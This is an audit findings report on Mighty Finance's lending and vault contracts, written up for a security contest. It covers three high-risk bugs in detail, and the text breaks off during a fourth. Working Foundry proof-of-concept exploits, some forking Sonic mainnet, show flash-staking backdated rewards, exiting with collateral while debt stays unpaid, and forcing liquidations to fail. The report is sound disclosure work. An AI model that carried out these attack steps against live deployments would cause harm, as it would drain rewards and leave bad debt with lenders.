# Mighty Finance - Findings Report

Prepared by: Nwebor Stephen

Auditors:

- [Stephen](https://github.com/Derastephh)
- [Greg](https://x.com/0xitsgreg)

# Table of contents
<details>

<summary>See table</summary>

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Backdated Rewards Allow Flash-Stake Drainage](#H-01)
    - ### [H-02. User Can Exit With Collateral Without Fully Repaying Debt](H-02)
    - ### [H-03. Fee Deducted Before Debt Repayment Causes Failed Liquidations and Permanent Bad Debt](H-03)
    - ### [H-04. Locked Epochs Cause Permanent Loss of xShadow Rewards](#H-04)
    - ### [H-05. No Slippage Protection in `ShadowRangeVault::closePosition` Lets Attackers Steal Collateral](#H-05)
    - ### [H-06. Vault Misinterprets Price Oracle Scale, Letting Attackers Borrow 100× More Than Allowed](#H-06)

</details>
</br>

# <a id='contest-summary'></a>Contest Summary

### Sponsor: Mighty Finance

### Dates: April 15th, 2025 - May 6th, 2025

[See more contest details here](https://cantina.xyz/competitions/616d8bb4-16ce-4ca9-9ce9-5b99d6e146ef)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 6
- Medium: 0
- Low: 2
- Info: 1

</br>


# High Risk Findings

## <a id='H-01'></a>H-01. Backdated Rewards Allow Flash-Stake Drainage

### Summary

The `StakingRewards.sol` logic allows users stake right before a reward period is set and still collect the full rewards for the past time. This makes it possible to flash-stake and drain emissions without actually participating during the intended reward period.

### Finding Description

The owner can set a reward period in the past using `StakingRewards::setReward`:
```solidity
function setReward(address token, uint256 startTime, uint256 endTime, uint256 total)
    external onlyOwner updateReward(address(0))
{
    ...
    if (block.timestamp > startTime && totalStaked > 0) {  // ← back-date branch
        uint256 dt = block.timestamp - startTime;
        rewardData[token].rewardPerTokenStored +=
            (rewardRate * dt * 1e18) / totalStaked; // ← instant reward injection
    }
    ...
}
```
If a user stakes a large amount right before this function runs, they benefit from all the backdated rewards, even though they were not staked during that past time.

Since there’s no lock-up or cooldown, they can stake, claim, and withdraw in quick succession:
```solidity
// StakingRewards::withdrawByLendingPool which is called from LendingPool::unStakeAndWithdraw
balanceOf[user] -= amount;
totalStaked     -= amount;
stakedToken.transfer(to, amount);               // immediate exit, no lock-up

// claim()
updateReward(msg.sender);                       // rewards finalised
transfer(msg.sender, claimable);                // full payout at once
```
This allows a flash loan attack to drain nearly all rewards of a backdated period with just one or two transactions.

### Impact Explanation

An attacker can:

- Watch for `StakingRewards::setReward` transactions in the mempool.
- Stake a large amount right before the transaction confirms.
- Immediately get all the rewards for a past period.
- Withdraw in the next block, keeping most of the rewards.

### Likelihood Explanation

This is very likely to happen when `startTime` is backdated because:

- No special permissions or time limits exist.
- Flash loans make it almost capital free.
- No cooldown prevents it.

### Proof of Code (PoC)

<details>
<summary>Code</summary>

Create a test folder under contracts, then create a `drain.t.sol` file under the test folder and finally paste the below code in the file. Run PoC with the cmd `forge test --mt test_BackdateDrain -vv`

```solidity
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";

import "contracts/AddressRegistry.sol";
import "contracts/lendingpool/LendingPool.sol";
import {ExtraInterestBearingToken} from "contracts/lendingpool/ExtraInterestBearingToken.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../interfaces/IWETH9.sol";
import "../VaultRegistry.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "../interfaces/IShadowRangePositionImpl.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "../lendingpool/StakingRewards.sol";

contract MockTokens is ERC20 {
    constructor(string memory _name, string memory symbol_) ERC20(_name, symbol_) {}

    function mint(address mintTO, uint256 amount) external {
        _mint(mintTO, amount);
    }
}

contract MockWETH is ERC20("Mock Wrapped Ether", "mWETH"), IWETH9 {
    constructor() {
        _mint(msg.sender, 1_000_000 ether);
    }

    function deposit() external payable override {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external override {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}

contract LendingPoolTest is Test {
    LendingPool lendingPool;
    AddressRegistry addressRegistry;
    MockTokens underlyingToken;
    MockTokens rewardToken;
    MockTokens stakingToken;
    address treasury;
    address factory;
    address owner;
    address attack;
    address user;
    uint256 reserveId;
    address eTokenAddress;
    VaultRegistry vaultRegistry;
    StakingRewards stakingRewards;

    // address constant WSonic = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;

    MockWETH mockWETH = new MockWETH();
    address WSonic = address(mockWETH);

    function setUp() public {
        owner = makeAddr("owner");
        attack = makeAddr("attack");
        user = makeAddr("user");
        treasury = makeAddr("Treasury");
        factory = makeAddr("Factory");
        vm.startPrank(owner);
        addressRegistry = new AddressRegistry(WSonic);
        addressRegistry.setAddress(AddressId.ADDRESS_ID_TREASURY, treasury);
        vaultRegistry = new VaultRegistry(address(addressRegistry));
        addressRegistry.setAddress(AddressId.ADDRESS_ID_VAULT_FACTORY, address(vaultRegistry));

        lendingPool = new LendingPool();
        lendingPool.initialize(address(addressRegistry), WSonic);
        reserveId = lendingPool.nextReserveId();
        underlyingToken = new MockTokens("UnderlyingToken", "UT");
        rewardToken = new MockTokens("RewardToken", "RT");
        stakingToken = new MockTokens("StakingToken", "ST");
        stakingRewards = new StakingRewards(address(stakingToken));
        lendingPool.initReserve(address(underlyingToken));
        eTokenAddress = lendingPool.getETokenAddress(reserveId);
        vm.stopPrank();
        underlyingToken.mint(eTokenAddress, 100_000 * (10 ** 18));
        underlyingToken.approve(address(lendingPool), 100_000 * (10 ** 18));

        address[2] memory users = [attack, user];
        for (uint256 i = 0; i < users.length; i++) {
            underlyingToken.mint(users[i], 100_000 * (10 ** 18));
            vm.prank(users[i]);
            underlyingToken.approve(address(lendingPool), 100_000 * (10 ** 18));
        }
    }

    function test_BackdateDrain() public {
    uint256 attackerStake = 1000 ether;
    uint256 rewardAmount = 1_000_000 ether;

    vm.warp(10 days);
    uint256 rewardStart = block.timestamp - 7 days; // Backdate reward start
    uint256 rewardEnd = block.timestamp + 7 days;

    // Owner funds reward token
    rewardToken.mint(owner, rewardAmount);
    vm.startPrank(owner);
    rewardToken.approve(address(stakingRewards), rewardAmount);
    vm.stopPrank();

    // Attacker receives enough tokens to flash stake
    stakingToken.mint(user, attackerStake);
    vm.startPrank(user);

    // Simulate attacker monitoring the mempool

    // Attacker stakes right before reward schedule is set (front-run)
    stakingToken.approve(address(stakingRewards), type(uint256).max);
    stakingRewards.stake(attackerStake, user);

    // Owner sets backdated reward startTime
    vm.stopPrank();
    vm.prank(owner);
    stakingRewards.setReward(address(rewardToken), rewardStart, rewardEnd, rewardAmount);

    // Attacker claims rewards asap
    vm.startPrank(user);
    uint256 beforeClaim = rewardToken.balanceOf(user);
    stakingRewards.claim();
    uint256 afterClaim = rewardToken.balanceOf(user);
    uint256 drained = afterClaim - beforeClaim;

    console2.log("Attacker drained: ", drained); // 499,999.999999999999000000

    // Attacker whithdraws full capital
    stakingRewards.withdraw(attackerStake, user);

    vm.stopPrank();
}
}
```
</details>

### Recommendation
- Take a snapshot of totalStaked at the actual `startTime` for fair backdated distribution or prevent `StakingRewards::setReward` from using a `startTime` in the past.
- Add cooldowns or minimum stake duration before claiming.














## <a id='H-02'></a>H-02. User Can Exit With Collateral Without Fully Repaying Debt

### Summary

The `ShadowRangeVault::reducePosition` function lets users partially exit their positions and repay borrowed funds. But the contract never checks the health of the position after these changes. Because swaps are allowed with no slippage and debt repayment does not require a minimum amount, users can reduce positions in a way that leaves the vault holding bad debt. Over time, this can lead to serious losses for lenders.

### Finding Description

The main issue is that `ShadowRangeVault::reducePosition` checks the debt ratio before making changes, but not after. Here’s the main flow:

```solidity
require(getDebtRatio(id) < liquidationDebtRatio, "DRH"); // pre-check

IShadowRangePositionImpl(position).reducePosition(...);   // removes liquidity, swaps, repays

require(getPositionValueByNftId(id) > minPositionSize, "PVL"); // only size check
```

Once the position passes the initial debt ratio check, the contract:
- Pulls liquidity and gives the user back tokens.
- Performs swaps with amountOutMinimum = 0, allowing any result — even bad ones.
- Accepts any repayment amount — even 0 — and doesn't revert.

The contract never checks again if the position is still healthy.

This lets users reduce `collateral`, repay a tiny amount, and keep the rest of the tokens. Here's the swap and repay logic:

```solidity
// Inside implementation contract
_decreasePosition(...);
_swapTokenExactInput(token0→token1, amount0In, 0); // no slippage protection
...
IVault(vault).repayExact(id, token0Left, token1Left);

// Inside repayExact
if (amount0 > currentDebt0) amount0 = currentDebt0; // no minimum check
lendingPool.repay(..., amount0);
```

### Impact Explanation

A user can:
- Pull out a large amount of tokens from their LP.
- Swap with no slippage check — possibly using manipulated prices.
- Repay only a small amount of what they borrowed.
- Walk away with the rest of the collateral.

Since no post debt check is done, the position ends up with more debt than it should. This turns the position into bad debt that can't be easily liquidated. If done repeatedly or at scale, this puts lender funds at risk.

### Likelihood Explanation

The function is accessible to any position owner. Since all values for swaps and repayments are user controlled and there are no access controls, the bug is easy to exploit. This also works gradually, which makes it harder to notice until it causes real damage.

### Proof of Code (PoC)

<details>
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../shadow/ShadowRangeVault.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AddressRegistry} from "../AddressRegistry.sol";
import {VaultRegistry} from "../VaultRegistry.sol";
import {IVault} from "../interfaces/IVault.sol";
import {LendingPool} from "../lendingpool/LendingPool.sol";
import {ShadowPositionValueCalculator} from "../shadow/ShadowPositionValueCalculator.sol";

import {IShadowNonfungiblePositionManager} from "../interfaces/IShadowNonfungiblePositionManager.sol";
import {IShadowV3Pool} from "../interfaces/IShadowV3Pool.sol";
import {IShadowSwapRouter} from "../interfaces/IShadowSwapRouter.sol";

contract MockPriceOracle is IPriceOracle {
    mapping(address => uint256) public prices;

    function setTokenPrice(address token, uint256 price) external {
        prices[token] = price;
    }

    function getTokenPrice(
        address token
    ) public view override returns (uint256) {
        return prices[token];
    }
}

contract ShadowRange is Test {
    address public constant TREASURY = address(0x1);
    IERC20 token0;
    IERC20 token1;

    VaultRegistry vaultRegistry;
    AddressRegistry registry;
    ShadowRangeVault vault;
    ShadowRangePositionImpl positionImpl;

    IShadowNonfungiblePositionManager shadowNonfungiblePositionManager;
    IShadowV3Pool shadowV3Pool;
    IShadowSwapRouter shadowSwapRouter;

    LendingPool public lendingPool;
    MockPriceOracle priceOracle;
    ShadowPositionValueCalculator valueCalculator;

    address attacker = address(0xdead);
    address lender1 = address(0x1337);
    address lender2 = address(0x1338);

    uint256 public token0ReserveId;
    uint256 public token1ReserveId;
    address public token0Address;
    address public token1Address;
    address public stakingToken0Address;
    address public stakingToken1Address;
    uint256 public initialDepositAmount = 1000 ether;

    address constant WETH9 = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant EGGS = 0xf26Ff70573ddc8a90Bd7865AF8d7d70B8Ff019bC;
    address constant USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;
    address constant ShadowNonFungible =
        0x12E66C8F215DdD5d48d150c8f46aD0c6fB0F4406;
    address constant ShadowPool = 0x324963c267C354c7660Ce8CA3F5f167E05649970;
    address constant ShadowRouter = 0x5543c6176FEb9B4b179078205d7C29EEa2e2d695;

    address constant UNI_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;

    string rpcUrl = "https://rpc.soniclabs.com";
    uint24 tickSpacing = 50;

    function setUp() public {
        vm.createSelectFork(rpcUrl, 21039807);
        token0 = IERC20(WETH9);
        token1 = IERC20(USDC);

        shadowNonfungiblePositionManager = IShadowNonfungiblePositionManager(
            ShadowNonFungible
        );
        shadowV3Pool = IShadowV3Pool(ShadowPool);
        shadowSwapRouter = IShadowSwapRouter(ShadowRouter);

        // mockRouter = new MockShadowSwapRouter();
        registry = new AddressRegistry(address(EGGS));
        vaultRegistry = new VaultRegistry(address(registry));
        positionImpl = new ShadowRangePositionImpl();
        priceOracle = new MockPriceOracle();
        valueCalculator = new ShadowPositionValueCalculator();

        registry.setAddress(AddressId.ADDRESS_ID_TREASURY, TREASURY);
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_NONFUNGIBLE_POSITION_MANAGER,
            address(shadowNonfungiblePositionManager)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_ROUTER,
            address(shadowSwapRouter)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_POSITION_VALUE_CALCULATOR,
            address(valueCalculator)
        );

        lendingPool = new LendingPool();
        lendingPool.initialize(address(registry), address(EGGS));

        // Initialize reserves
        token0ReserveId = 1; // First reserve will have ID 1
        lendingPool.initReserve(address(token0));

        token1ReserveId = 2; // Second reserve will have ID 2
        lendingPool.initReserve(address(token1));

        vault = new ShadowRangeVault();
        vault.initialize(
            address(registry),
            address(vaultRegistry),
            address(shadowV3Pool),
            address(positionImpl)
        );

        // Get eToken addresses
        token0Address = lendingPool.getETokenAddress(token0ReserveId);
        token1Address = lendingPool.getETokenAddress(token1ReserveId);

        // Get staking addresses
        stakingToken0Address = lendingPool.getStakingAddress(token0ReserveId);
        stakingToken1Address = lendingPool.getStakingAddress(token1ReserveId);

        vm.label(lender1, "lender1");

        // Set price oracle
        registry.setAddress(
            AddressId.ADDRESS_ID_PRICE_ORACLE,
            address(priceOracle)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_VAULT_FACTORY,
            address(vaultRegistry)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_LENDING_POOL,
            address(lendingPool)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_LIQUIDATION_FEE_RECIPIENT,
            lender1
        );
        vaultRegistry.newVault(address(vault));

        vault.setReserveIds(token0ReserveId, token1ReserveId);

        priceOracle.setTokenPrice(address(token0), 0.5 ether);
        priceOracle.setTokenPrice(address(token1), 1 ether);

        deal(address(token0), attacker, 100 ether);
        deal(address(token1), attacker, 100 ether);

        vm.label(attacker, "Attacker");
        vm.label(lender2, "lender2");

        deal(address(token0), lender1, 1_000_000 ether);
        deal(address(token1), lender1, 1_000_000 ether);
        deal(address(token0), lender2, 1_000_000 ether);
        deal(address(token1), lender2, 1_000_000 ether);
    }

 function testOpenPos() public {
        // token 1 has 6 decimals
        uint256 token1LendersAmount = 1000e6;
        // setup initial liquidity in lending pool
        vm.startPrank(lender1);
        token0.approve(address(lendingPool), initialDepositAmount);
        token1.approve(address(lendingPool), token1LendersAmount);
        lendingPool.depositAndStake(
            token0ReserveId,
            initialDepositAmount,
            lender1,
            0
        );
        lendingPool.depositAndStake(
            token1ReserveId,
            token1LendersAmount,
            lender1,
            0
        );
        vm.stopPrank();

        vm.startPrank(lender2);
        token0.approve(address(lendingPool), initialDepositAmount);
        token1.approve(address(lendingPool), token1LendersAmount);
        lendingPool.depositAndStake(
            token0ReserveId,
            initialDepositAmount,
            lender2,
            0
        );
        lendingPool.depositAndStake(
            token1ReserveId,
            token1LendersAmount,
            lender2,
            0
        );
        vm.stopPrank();

        uint256 getVaultId = vault.vaultId();
        console.log("vaultId", getVaultId);

        // Enable vault borrowing and set credit limits
        vm.startPrank(address(lendingPool.owner()));
        lendingPool.enableVaultToBorrow(vault.vaultId());
        lendingPool.setCreditsOfVault(
            vault.vaultId(),
            token0ReserveId,
            1000000 ether
        );
        lendingPool.setCreditsOfVault(
            vault.vaultId(),
            token1ReserveId,
            1000000 ether
        );
        vm.stopPrank();

        uint256 minPositionSize = vault.minPositionSize();
        uint256 liquidationDebtRatio = vault.liquidationDebtRatio();

        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
        amount0Principal: 1 ether,
        amount1Principal: 1e6,
        amount0Borrow: 0,
        amount1Borrow: 8600,
        amount0SwapNeededForPosition: 0,
        amount1SwapNeededForPosition: 0,
        amount0Desired: 1 ether,
        amount1Desired: 1e6,
        deadline: block.timestamp + 10,
        tickLower: -283950,
        tickUpper: -283900,
        ul: 0,
        ll: 0
    });

        deal(address(token0), attacker, 1_000_000 ether);
        deal(address(token1), attacker, 1_000_000);
        vm.startPrank(attacker);
        token0.approve(address(vault), 1_000_000 ether);
        token1.approve(address(vault), 1_000_000);
        vault.openPosition(params);

        uint256 positionId = vault.nextPositionID() - 1;

        uint256 token1DebtId = vault.getPositionInfos(positionId).token1DebtId;

        vm.stopPrank();
    }

    function test_ReducePositionLeavesDebt() public {
    // attacker opens a position
    testOpenPos(); //

    uint256 positionId = vault.nextPositionID() - 1;

    // ensure the debt ratio is acceptable
    uint256 preDR = vault.getDebtRatio(positionId);
    assertLt(preDR, vault.liquidationDebtRatio(), "check must pass");

    // attacker reduces position, withdrawing 90% of liquidity

    IVault.ReducePositionParams memory params = IVault.ReducePositionParams({
        positionId: positionId,
        reducePercentage: 9000, // 90%
        amount0ToSwap: 0,       // no slippage protection
        amount1ToSwap: 0        // no slippage protection
    });

    uint256 token0Bal = token0.balanceOf(attacker);
    uint256 token1Bal = token1.balanceOf(attacker);
    console2.log("Attacker token0 balance before:", token0Bal); // 999,999.000000000000003148
    console2.log("Attacker token1 balance before:", token1Bal); // 1,008,600

    vm.startPrank(attacker);
    vault.reducePosition(params);
    vm.stopPrank();

    uint256 token0Bal2 = token0.balanceOf(attacker);
    uint256 token1Bal2 = token1.balanceOf(attacker);

    // check post reduction position still exists but has unrepaid debt
    uint256 token1DebtId = vault.getPositionInfos(positionId).token1DebtId;
    console2.log("Token1 debtId:", token1DebtId); // 1

    // left the debt unpaid but debt ratio remained under liquidation threshold
    uint256 postDR = vault.getDebtRatio(positionId);

    console2.log("Debt ratio before:", preDR); // 172
    console2.log("Debt ratio after:", postDR); // 1719
    console2.log("Attacker token0 balance:", token0Bal2); // this gave  999,999.899999999999997389
    console2.log("Attacker token1 balance:", token1Bal2); // this gave 1,008.600
}
}
```
</details>

### Recommendation

- Add a final debt ratio check after the position is reduced:
```solidity
require(getDebtRatio(id) < liquidationDebtRatio, "debt too high after reduction");
```
- Enforce slippage protection on swaps by requiring a `minAmountOut` value.
- Require that a good portion of the debt is repaid, or disallow position reduction unless a valid minimum repayment value is made.


















## <a id='H-03'></a>H-03. Fee Deducted Before Debt Repayment Causes Failed Liquidations and Permanent Bad Debt

### Summary

The liquidation logic in `ShadowRangePositionImpl::liquidatePosition` function applies protocol and caller fees before attempting to repay debt. If the remaining `collateral` is not enough to fully repay the position, the liquidation reverts. This creates a fixed position that can no longer be closed or liquidated, and the debt keeps growing with interest, leading to permanent bad debt in the system.

### Finding Description

In the liquidation process, the contract first removes the full `LP position` and calculates the total collateral received:

```solidity
ShadowRangeVault.liquidatePosition()          // entry point
 └─ ShadowRangePositionImpl.liquidatePosition()  // actual logic
      ├─ _claimFees() / _claimRewards()
      ├─ _decreasePosition(liquidity)           // withdraws all LP liquidity
      ├─   …  **fee calculation & transfer**  …
      ├─ attempt to repay debt
      └─ IVault(vault).repayExact(...)
```

Then, it takes out protocol and caller fees:

```solidity
// ShadowRangePositionImpl::liquidatePosition
// 5% protocol fee
token0Fees = token0Reduced * vars.liquidationFee / 10000;
pay(token0, address(this), vars.liquidationFeeRecipient, token0Fees);

// caller fee from the protocol fee
uint256 token0CallerFees = token0Fees * vars.liquidationCallerFee / 10000;
pay(token0, address(this), caller, token0CallerFees);

// remove both from remaining collateral
token0Reduced -= token0Fees + token0CallerFees;


// A similar block runs for token1.
```

Only after deducting fees does the contract attempt to repay the debt:

```solidity
ShadowRangePositionImpl::liquidatePosition
if (currentDebt0 > token0Reduced) {
    uint256 amount1Excess = token1Reduced - currentDebt1; // underflow if token1Reduced < currentDebt1
    _swapTokenExactInput(token1, token0, amount1Excess,
                         currentDebt0 - token0Reduced);   // reverts
}
```

When both tokens are undercollateralised after fee deduction the subtraction underflows, aborting the transaction and even if the swap succeeded, the vault performs a final check:

```solidity
// ShadowRangeVault::liquidatePosition 
(uint256 currentDebt0, uint256 currentDebt1) = getPositionDebt(positionId);
require(currentDebt0 == 0 && currentDebt1 == 0, "Still debt"); // requires full repayment
```
As a result, liquidation fails entirely. The debt keeps compounding due to interest accumulated, and the position becomes permanently stuck.

### Impact Explanation

This bug allows underwater positions to become unliquidatable. Fees are deducted before debt repayment, so even slightly undercollateralized positions will cause liquidation to revert. These positions are stuck and continue to accumulate interest, creating permanent, bad debt in the system.

Because the LendingPool relies on these positions being closed or liquidated to recover funds, other users can also be affected, since the pool health is compromised.

### Likelihood Explanation

This is likely to occur in real usage.

The default parameters show this clearly:
- `liquidationDebtRatio` = 8600 (86%)
- `liquidationFee` = 500 (5%)

A borrower can start with an 86% debt ratio. Over time, interest accumulates, and the ratio creeps above 95%. When liquidation starts, 5% of the collateral is deducted as fees, making the remaining collateral insufficient to repay the debt.

This is common in volatile defi markets, so the scenario is realistic.

### Proof of Code (PoC):

<details>
<summary>Code</summary>

Create a test folder under `/contracts`, then create a file called testFee.t.sol under the test folder, then paste the below code in the file. Run PoC with `forge test --mt testFeeFirst -vv`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../shadow/ShadowRangeVault.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AddressRegistry} from "../AddressRegistry.sol";
import {VaultRegistry} from "../VaultRegistry.sol";
import {IVault} from "../interfaces/IVault.sol";
import {LendingPool} from "../lendingpool/LendingPool.sol";
import {ShadowPositionValueCalculator} from "../shadow/ShadowPositionValueCalculator.sol";

import {IShadowNonfungiblePositionManager} from "../interfaces/IShadowNonfungiblePositionManager.sol";
import {IShadowV3Pool} from "../interfaces/IShadowV3Pool.sol";
import {IShadowSwapRouter} from "../interfaces/IShadowSwapRouter.sol";

contract MockPriceOracle is IPriceOracle {
    mapping(address => uint256) public prices;

    function setTokenPrice(address token, uint256 price) external {
        prices[token] = price;
    }

    function getTokenPrice(
        address token
    ) public view override returns (uint256) {
        return prices[token];
    }
}

contract ShadowRange is Test {
    address public constant TREASURY = address(0x1);
    IERC20 token0;
    IERC20 token1;

    VaultRegistry vaultRegistry;
    AddressRegistry registry;
    ShadowRangeVault vault;
    ShadowRangePositionImpl positionImpl;

    IShadowNonfungiblePositionManager shadowNonfungiblePositionManager;
    IShadowV3Pool shadowV3Pool;
    IShadowSwapRouter shadowSwapRouter;

    LendingPool public lendingPool;
    MockPriceOracle priceOracle;
    ShadowPositionValueCalculator valueCalculator;

    address attacker = address(0xdead);
    address lender1 = address(0x1337);
    address lender2 = address(0x1338);

    uint256 public token0ReserveId;
    uint256 public token1ReserveId;
    address public token0Address;
    address public token1Address;
    address public stakingToken0Address;
    address public stakingToken1Address;
    uint256 public initialDepositAmount = 1000 ether;

    address constant WETH9 = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant EGGS = 0xf26Ff70573ddc8a90Bd7865AF8d7d70B8Ff019bC;
    address constant USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;
    address constant ShadowNonFungible =
        0x12E66C8F215DdD5d48d150c8f46aD0c6fB0F4406;
    address constant ShadowPool = 0x324963c267C354c7660Ce8CA3F5f167E05649970;
    address constant ShadowRouter = 0x5543c6176FEb9B4b179078205d7C29EEa2e2d695;

    address constant UNI_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;

    string rpcUrl = "https://rpc.soniclabs.com";
    uint24 tickSpacing = 50;

    function setUp() public {
        vm.createSelectFork(rpcUrl, 21039807);
        token0 = IERC20(WETH9);
        token1 = IERC20(USDC);

        shadowNonfungiblePositionManager = IShadowNonfungiblePositionManager(
            ShadowNonFungible
        );
        shadowV3Pool = IShadowV3Pool(ShadowPool);
        shadowSwapRouter = IShadowSwapRouter(ShadowRouter);

        // mockRouter = new MockShadowSwapRouter();
        registry = new AddressRegistry(address(EGGS));
        vaultRegistry = new VaultRegistry(address(registry));
        positionImpl = new ShadowRangePositionImpl();
        priceOracle = new MockPriceOracle();
        valueCalculator = new ShadowPositionValueCalculator();

        registry.setAddress(AddressId.ADDRESS_ID_TREASURY, TREASURY);
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_NONFUNGIBLE_POSITION_MANAGER,
            address(shadowNonfungiblePositionManager)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_ROUTER,
            address(shadowSwapRouter)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_POSITION_VALUE_CALCULATOR,
            address(valueCalculator)
        );

        lendingPool = new LendingPool();
        lendingPool.initialize(address(registry), address(EGGS));

        // Initialize reserves
        token0ReserveId = 1; // First reserve will have ID 1
        lendingPool.initReserve(address(token0));

        token1ReserveId = 2; // Second reserve will have ID 2
        lendingPool.initReserve(address(token1));

        vault = new ShadowRangeVault();
        vault.initialize(
            address(registry),
            address(vaultRegistry),
            address(shadowV3Pool),
            address(positionImpl)
        );

        // Get eToken addresses
        token0Address = lendingPool.getETokenAddress(token0ReserveId);
        token1Address = lendingPool.getETokenAddress(token1ReserveId);

        // Get staking addresses
        stakingToken0Address = lendingPool.getStakingAddress(token0ReserveId);
        stakingToken1Address = lendingPool.getStakingAddress(token1ReserveId);

        vm.label(lender1, "lender1");

        // Set price oracle
        registry.setAddress(
            AddressId.ADDRESS_ID_PRICE_ORACLE,
            address(priceOracle)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_VAULT_FACTORY,
            address(vaultRegistry)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_LENDING_POOL,
            address(lendingPool)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_LIQUIDATION_FEE_RECIPIENT,
            lender1
        );
        vaultRegistry.newVault(address(vault));

        vault.setReserveIds(token0ReserveId, token1ReserveId);

        priceOracle.setTokenPrice(address(token0), 0.5 ether);
        priceOracle.setTokenPrice(address(token1), 1 ether);

        deal(address(token0), attacker, 100 ether);
        deal(address(token1), attacker, 100 ether);

        vm.label(attacker, "Attacker");
        vm.label(lender2, "lender2");

        deal(address(token0), lender1, 1_000_000 ether);
        deal(address(token1), lender1, 1_000_000 ether);
        deal(address(token0), lender2, 1_000_000 ether);
        deal(address(token1), lender2, 1_000_000 ether);
    }

    function testOpenPos() public {
        // token 1 has 6 decimals
        uint256 token1LendersAmount = 1000e6;
        // setup initial liquidity in lending pool
        vm.startPrank(lender1);
        token0.approve(address(lendingPool), initialDepositAmount);
        token1.approve(address(lendingPool), token1LendersAmount);
        lendingPool.depositAndStake(
            token0ReserveId,
            initialDepositAmount,
            lender1,
            0
        );
        lendingPool.depositAndStake(
            token1ReserveId,
            token1LendersAmount,
            lender1,
            0
        );
        vm.stopPrank();

        vm.startPrank(lender2);
        token0.approve(address(lendingPool), initialDepositAmount);
        token1.approve(address(lendingPool), token1LendersAmount);
        lendingPool.depositAndStake(
            token0ReserveId,
            initialDepositAmount,
            lender2,
            0
        );
        lendingPool.depositAndStake(
            token1ReserveId,
            token1LendersAmount,
            lender2,
            0
        );
        vm.stopPrank();

        uint256 getVaultId = vault.vaultId();
        console.log("vaultId", getVaultId);

        // Enable vault borrowing and set credit limits
        vm.startPrank(address(lendingPool.owner()));
        lendingPool.enableVaultToBorrow(vault.vaultId());
        lendingPool.setCreditsOfVault(
            vault.vaultId(),
            token0ReserveId,
            1000000 ether
        );
        lendingPool.setCreditsOfVault(
            vault.vaultId(),
            token1ReserveId,
            1000000 ether
        );
        vm.stopPrank();

        uint256 minPositionSize = vault.minPositionSize();
        uint256 liquidationDebtRatio = vault.liquidationDebtRatio();

        IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
        amount0Principal: 0.21 ether,
        amount1Principal: 1e6,
        amount0Borrow: 0,
        amount1Borrow: 1e5,
        amount0SwapNeededForPosition: 0,
        amount1SwapNeededForPosition: 0,
        amount0Desired: 0.21 ether,
        amount1Desired: 1e6,
        deadline: block.timestamp + 10,
        tickLower: -283950,
        tickUpper: -283900,
        ul: 0,
        ll: 0
    });

        deal(address(token0), attacker, 1_000_000 ether);
        deal(address(token1), attacker, 1_000_000);
        vm.startPrank(attacker);
        token0.approve(address(vault), 1_000_000 ether);
        token1.approve(address(vault), 1_000_000);
        vault.openPosition(params);

        uint256 positionId = vault.nextPositionID() - 1;

        uint256 token1DebtId = vault.getPositionInfos(positionId).token1DebtId;

        vm.stopPrank();
    }

    function testFeeFirst() public {

    // simulate prices
    priceOracle.setTokenPrice(address(token0), 1 ether);
    priceOracle.setTokenPrice(address(token1), 1 ether);

    // open a position
    testOpenPos();

    // simulate price drop to make the position undercollateralized
    priceOracle.setTokenPrice(address(token0), 0.5 ether);

    uint256 positionId = vault.nextPositionID() - 1;

    uint256 debtRatio = vault.getDebtRatio(positionId);
    console2.log("Debt ratio after price drop:", debtRatio);// 9523 which is greater than liquidationDebtRatio (8600)

    // lender1 is approved as liquidator
    vm.prank(address(lendingPool.owner()));
    vault.setLiquidator(address(lender1), true);

    // try to liquidate
    vm.prank(lender1);
    vm.expectRevert(); // reverts when trying to swap tokens in _swapTokenExactInput
    vault.liquidatePosition(positionId);
}
}
```
</details>

### Recommendation

1. Rewrite the logic for liquidation:
- First attempt to repay the full debt first using all available collateral.
- Then only if full repayment succeeds, then apply protocol and caller fees on any leftover collateral.

2. Find a way to apply fee when a user first opens a position
















## <a id='H-04'></a>H-04. Locked Epochs Cause Permanent Loss of xShadow Rewards

### Summary

When claiming rewards during a locked epoch, `xShadow` tokens are silently withheld and never forwarded to the `vault`. If the position is closed before the epoch unlocks, the tokens are permanently lost.

### Finding Description

